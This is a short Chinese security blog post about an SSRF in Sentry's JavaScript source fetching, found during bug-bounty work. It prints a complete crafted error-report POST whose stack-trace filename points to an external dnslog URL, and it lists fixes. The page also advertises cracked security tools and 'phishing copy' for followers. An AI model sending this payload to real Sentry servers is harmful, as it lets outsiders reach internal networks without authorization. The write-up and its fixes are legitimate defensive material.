#  记录一次某SRC的SSRF挖掘-top10漏洞挖掘   
原创 漏洞挖掘  渗透安全HackTwo   2023-12-20 00:00  
  
**0x01前言**  
  
  
        Sentry中Enable JavaScript source fetching（源码预获取）的选项是默认打开的，这个选项的作用是去抓取上报的错误JSON中的stack trace中的filename对应的url对应的代码，所以部署sentry的服务器会盲目的GET请求坏人的url，坏人就达到了通过我们自己的服务器发起恶意请求的攻击目的，可以从外网来攻击内网（SSRF）  
。  
  
**文章末尾领取资料**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq43NodS24T8LU5vJ4xuPuUJJOUys5XuG8hXjj0kZbKtl7A6adZ3YLKuJeia0MERyEkoEGI6ELucJ2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq43NodS24T8LU5vJ4xuPuUJBSaRjor69R849aLCE0qVxIVUUtaVicJzx7V7IyQaD5c1CKWia6uJNgjw/640?wx_fmt=png&from=appmsg "")  
```
 POST /api/1/store/?sentry_version=7&sentry_client=raven-js%2f3.15.0&sentry_key=xxxxxxxxxxxxxxxxxxxxxxx11d0f87 HTTP/1.1
Host: xxx.xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9
Content-type: application/json
Origin:https://xxx.xxx.xxx.xxx

{"project":"30","logger":"javascript","platform":"javascript","exception":{"values":[{"type":"Error","value":"Trying to get control scope but angular isn't ready yet or something like this","stacktrace":{"frames":[{"filename":"http://dnslog/","lineno":110,"colno":81071,"function":"xmlHttpRequest.o","in_app":true}]}}]}}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq43NodS24T8LU5vJ4xuPuUJCmkxo8sLEAbQqcOjC6hFUh1PuRCD0Q7icBLyhNdJrS5wU4JicOOrYa7A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq43NodS24T8LU5vJ4xuPuUJlF9mJ46xnsGWLztFhuWpKfXFmuRssWw8uwohCJ89lb4N4stB6fkicZA/640?wx_fmt=png&from=appmsg "")  
  
  
修复方式:  
1. sentry关闭 source code scrapping；  
  
1. 保证配置文件中的黑名单不为空：/sentry/conf/server.py  
  
1. 关闭源码抓取，隐藏sentry_key  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq43NodS24T8LU5vJ4xuPuUJFib7ryDQDewpAhiaRpXdJl21SdAmQyyXLyeW1T9R3BFDlEuhPMBMl6rQ/640?wx_fmt=png&from=appmsg "")  
  
  
**0x02最后**  
  
如果师傅们不想报昂贵的培训班又想学习  
SRC挖掘欢迎加入  
内部VIP知识星球  
，后台回复“**星球**  
”，有具体介绍，里面可以学习更多漏洞相关的知识和资源，包含但不限于SRC漏洞挖掘、攻防演练、内网渗透及各种工具、学习视频、账号等等，送5张20元优惠券用完即止，早加入早享受（后续价格只增降）。  
  
  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
**关注领取资源：**  
  
回复“app" 获取  app渗透和app抓包教程  
  
回复“渗透字典" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“书籍" 获取 网络安全相关经典书籍电子版pdf  
  
回复“钓鱼001” 获取钓鱼文案  
  
**压缩包解压密码：HackTwo**  
  
# 最后必看  
  
  
    本工具或文章仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，如果你学习了该文章内容需要测试请自行搭建靶机环境，勿用于非法行为。  
  
  
    为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。  
  
  
    在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。  
  
  
    如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
[1. 4.8-CobaltStrike4.8汉化+最新插件集成版发布](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483949&idx=1&sn=cae68096be06be4f0ea746ee5908dc79&chksm=cf16a49df8612d8b0b5cc2e49e6367cc91b7fd1f6d71c555d6631dbd3bd883d5242972e506b9&scene=21#wechat_redirect)  
  
  
[2. 2023HW的110+个poc发布直接下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483899&idx=1&sn=8f428144e749c1f115d39bae69072604&chksm=cf16a74bf8612e5dbc086b8af8a08b195481f367a8904f89ac44e66f06703afe54f1c6c641d6&scene=21#wechat_redirect)  
  
  
[3. 最新Nessus2023下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483887&idx=1&sn=16af3498a081829d23b3dbd8037d000e&chksm=cf16a75ff8612e495b8b97e373e6bdf0297d814d48e8029a387a7c295389757fe7eccd932ba0&scene=21#wechat_redirect)  
  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.2.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：  
关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜  
欢的朋友可以点赞转  
发支持一下  
  
  
